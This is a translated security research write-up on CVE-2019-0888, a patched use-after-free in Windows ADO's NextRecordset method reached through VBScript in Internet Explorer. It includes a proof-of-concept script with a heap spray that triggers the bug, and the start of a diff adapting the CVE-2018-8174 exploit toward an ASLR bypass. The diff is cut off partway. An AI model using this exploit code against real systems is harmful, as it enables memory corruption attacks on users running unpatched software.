`SophosLabs`攻击安全研究团队在`Windows`的`ActiveX`数据对象（ADO）组件中发现了一个安全漏洞。
微软在2019年6月的补丁解决了这个问题。
自修补程序发布以来已经过去了一个月，因此我们决定发布对该错误的利用报告，以及如何利用它来实现`ASLR`绕过和读写语句。
本文使用了来自Windows 10的32位vbscript.dll文件版本5.812.10240.16384中的符号和类型。
### 背景
`ADO`是一种通过`OLE`数据库提供程序访问和操作数据的API。 在我们写明的示例中，`OLE DB`提供程序是`Microsoft SQL`服务器。
使用各种语言的不同程序可以使用此`API`。
在本文的范围内，我们将使用在`Internet Explorer`中运行的`VBScript`代码中的`ADO`，并连接到本地运行的`Microsoft
SQL Server 2014 Express`实例。
下面是一个基本`VBScript`脚本示例，它通过使用`ADO Recordset`对象建立与本地数据库（名为`SQLEXPRESS`）的连接：
    On Error Resume Next
    Set RS = CreateObject("ADOR.Recordset")
    RS.Open "SELECT * FROM INFORMATION_SCHEMA.COLUMNS", _
                    "Provider=SQLOLEDB;" & _
                    "Data Source=.\SQLEXPRESS;" & _
                    "Initial Catalog=master;" & _
                    "Integrated Security=SSPI;" & _
                    "Trusted_Connection=True;"
    If Err.Number <> 0 Then
            MsgBox("DB open error")
    Else
            MsgBox("DB opened")
    End If
使用来自`Internet Explorer`的ADO建立连接会提示此安全警告，这会不便于进行错误利用。
### 漏洞
`Recordset Object`方法`NextRecordset`不正确地处理其`RecordsAffected`参数。
当应用程序使用传递给它的`Object-typed`变量作为`RecordsAffected`参数调用此方法时，该方法将使该对象的引用计数减少1，同时保持变量可引用。
当引用计数降为0时，操作系统会销毁该对象并释放其内存。 但是，由于对象仍然可以通过其变量名称引用，因此进一步使用该变量将导致`Use-After-Free`条件。
以下是有关`NextRecordset`功能的重要信息：
  * 使用`NextRecordset`方法在复合命令语句或返回多个结果的存储过程中返回下一个命令的结果。
  * `NextRecordset`方法在断开连接的`Recordset`对象上不可用。
  * 参数：`RecordsAffected`  
可选的。 提供程序返回当前操作影响的记录数的`Long`变量。
简单地说，该方法适用于连接的`Recordset`对象，检索并返回某种与数据库相关的数据，并将数字写回所提供的参数。
该方法在库`msado15.dll`中实现，函数为`CRecordset::NextRecordset`。
这是在库的`COM`接口中定义`NextRecordset`的方式：
如果方法成功检索与数据库相关的数据，则会调用内部函数`ProcessRecordsAffected`来处理受影响记录数量到参数`RecordsAffected`的分配。
在`ProcessRecordsAffected`内部，库创建一个名为`local_copy_of_RecordsAffected`的局部变量，将`RecordsAffected`参数浅拷贝到其中，然后调用`VariantClear`函数：
`VariantClear`在这里描述。
“该函数通过将vt字段设置为`VT_EMPTY`来清除`VARIANTARG`。”  
“`VARIANTARG`的当前内容先发布。 [...]如果vt字段是`VT_DISPATCH`，则释放该对象。“
`VBScript`对象变量本质上是用`C++`实现的包装`ActiveX`对象。
它们由`CreateObject`函数创建，例如上面代码示例中的变量`RS`。
`VBScript`对象在内部表示为`VT_DISPATCH`类型的`Variant`结构。
因此，在这种情况下，对`VariantClear`的调用会将`local_copy_of_RecordsAffected`的类型设置为`VT_EMPTY`，并对其执行“释放”，这意味着它将调用其基础`C++`对象的`::Release`方法，该方法将对象的引用计数减1（
如果引用计数达到0，则销毁该对象。
在`VariantClear`调用之后，该函数继续如下：
此函数将64位整数变量`RecordsAffectedNum`转换为带符号的32位整数（此处称为类型VT_I4），并将该值传递给`VariantChangeType`，以尝试将其转换为`RecordsAffected_vt`类型的形式，即使得`VT_DISPATCH`容易被攻击。
不存在将`VT_I4`类型转换为`VT_DISPATCH`类型的逻辑，因此`VariantChangeType`将始终在此处失败，并且将早期的路径返回。
由于在其`COM`接口声明中使用`out`属性定义了`RecordsAffected`，因此`ProcessRecordsAffected`处理`RecordsAffected`的方式将对程序产生影响：
“[out]属性指示作为指针的参数及其在内存中的关联数据将从被调用过程传递回调用过程。”
简单地说，在NextRecordset返回后，无论是处于原始状态还是由ProcessRecordsAffected修改为的状态，RecordsAffected将被传递回程序。回顾函数在易受攻击的场景中经历的执行路径，我们可以看到它到达return语句而不直接修改RecordsAffected。
VariantClear在RecordsAffected的副本上调用，因此它会触发副本的基础C ++对象的释放，并将副本的类型更改为VT_EMPTY。
由于复制是以浅层方式完成的，因此`RecordsAffected`及其副本都包含指向底层`C++`对象的相同指针。其中一个变量的释放相当于第二个变量的释放。但是，将副本的类型更改为`VT_EMPTY`将对`RecordsAffected`没有影响，其类型将保持不变。
由于`RecordsAffected`的类型尚未清空，它将被传递回程序并保持可引用，尽管其基础`C++`对象被释放并且可能被释放。
考虑到每次调用方法时看似如何触发错误，它如何设置完成调用而不会崩溃？
回顾文档，它指定`RecordsAffected`应该是`Long`类型。`VariantClear`对`VT_I4`变体的破坏性影响与对`VT_DISPATCH`变体（释放其对象）的破坏性影响不同。因此，只要对方法的调用使用符合预期类型的​​`RecordsAffected`，就不会对程序产生负面影响。
### 修复过程
这个漏洞在微软2019年6月版的补丁周二进行了修复，并被分配为`CVE-2019-0888`。
函数`ProcessRecordsAffected`被修补以省略局部变量`local_copy_of_RecordsAffected`，而是直接在`RecordsAffected`上操作，正确清空其类型并防止它被传递回程序。
### 攻击方案
使用此错误实现某种类型的`exploit`原语的最简单方法是使对象被释放，然后立即使用与释放对象相同大小的受控数据内存分配来填写堆，以便使用的内存
保持对象现在拥有我们自己的任意数据。
    On Error Resume Next
    Set RS = CreateObject("ADOR.Recordset")
    Set freed_object = CreateObject("ADOR.Recordset")
    ' Open Recordset connection to database
    RS.Open "SELECT * FROM INFORMATION_SCHEMA.COLUMNS", _
                    "Provider=SQLOLEDB;" & _
                    "Data Source=.\SQLEXPRESS;" & _
                    "Initial Catalog=master;" & _
                    "Integrated Security=SSPI;" & _
                    "Trusted_Connection=True;"
    ' Connection objects to be used for heap spray later
    Dim array(1000)
    For i = 0 To 1000
            Set array(i) = CreateObject("ADODB.Connection")
    Next
    ' Data to spray in heap: allocation size will be 0x418
    ' (size of CRecordset in 32-bit msado15.dll)
    spray = ChrW(&h4141) & ChrW(&h4141) & _
            ChrW(&h4141) & ChrW(&h4141) & _
            Space(519)
    ' Trigger bug
    Set Var1 = RS.NextRecordset(freed_object)
    ' Perform heap spray
    For i = 0 To 1000
            array(i).ConnectionString = spray
    Next
    ' Trigger use after free
    freed_object.Clone()
第4行创建了一个新的`VBScript`对象`freed_object`，其底层`C++`对象的类型为`CRecordset`，结构为`0x418`字节。
第27行将`freed_object`的底层`C++`对象的引用计数减少为0，并且应该导致其内部资源的释放。
第31行使用`ADODB.Connection`类的`ConnectionString`属性来注入堆。当一个字符串被分配到`ConnectionString`时，它会创建一个本地副本，分配一个与分配的字符串大小相同的内存块，并将其内容复制到其中。制作注入字符串以产生`0x418`字节的分配。
第35行解除引用`freed_object`。此时，对此变量的任何引用都将调用基础`C++`对象上的动态分派，这意味着将取消引用其虚拟表指针，并从该内存加载函数指针。由于虚拟表指针位于`C++`对象的偏移0处，因此将加载该值，并且稍后会在前4个字节`0x41414141`中导致内存访问冲突异常。
为了使这个原语能对实际漏洞产生效果，我们需要依赖于在程序的地址空间，可控的存储器地址。这是`ASLR`无法实现的壮举。必须使用更好的方法来破解像`ASLR`这样的防御措施以便在系统上利用这个漏洞。
### 进一步攻击
在寻找有关类似`VBScript`错误的开发方法的现有研究时，我们遇到了`CVE-2018-8174`。
被称为“双杀”漏洞的是2018年5月安全公司奇虎360在网络中发现的。大量文章都是关于剖析捕获的漏洞利用和底层漏洞的，所以有关详细信息，我们将参考以下内容：
[1] [Analysis of CVE-2018-8174 VBScript
0day](http://blogs.360.cn/post/cve-2018-8174-en.html), 360 Qihoo
[2] [Delving deep into VBScript: Analysis of CVE-2018-8174
exploitation](https://securelist.com/delving-deep-into-vbscript-analysis-of-cve-2018-8174-exploitation/86333/), Kaspersky Lab
[3] [Dissecting modern browser exploit: case study of
CVE-2018–8174](https://medium.com/@florek/dissecting-modern-browser-exploit-case-study-of-cve-2018-8174-1a6046729890),
[piotrflorczyk](https://github.com/piotrflorczyk)
`CVE-2018-8174`是关于处理 `Class_Terminate`回调函数的`VBScript`中的释放后使用错误。
从本质上讲，它提供了释放`VBScript`对象但保持可引用的能力，类似于`ADO bug`的属性。
漏洞利用了一种复杂的技术，该技术采用类型混淆攻击将释放使用后的功能转换为`ASLR`绕过和随处读写原语。
该技术本身并没有用（没有启用它的bug），并且在技术上不是一个bug，所以它从来没有“修复”，并且仍然存在于代码库中。 `Piotr
Florczyk`在文章中解释了这种技术。
鉴于2个错误之间的相似性，应该可以从Florczyk的文章中获取`CVE-2018-8174`的注释漏洞利用代码，替换特定于错误的代码部分以利用`ADO`错误，并使其成功运行办法。
    diff --git a/analysis_base.vbs b/analysis_modified.vbs
    index 6c1cd3f..fd25809 100644
    --- a/analysis_base.vbs
    +++ b/analysis_modified.vbs
    @@ -1,3 +1,14 @@
    +Dim RS(13)
    +For i = 0 to UBound(RS)
    +    Set RS(i) = CreateObject("ADOR.Recordset")
    +    RS(i).Open "SELECT * FROM INFORMATION_SCHEMA.COLUMNS", _
    +        "Provider=SQLOLEDB;" & _
    +        "Data Source=.\SQLEXPRESS;" & _
    +        "Initial Catalog=master;" & _
    +        "Integrated Security=SSPI;" & _
    +        "Trusted_Connection=True;"
    +Next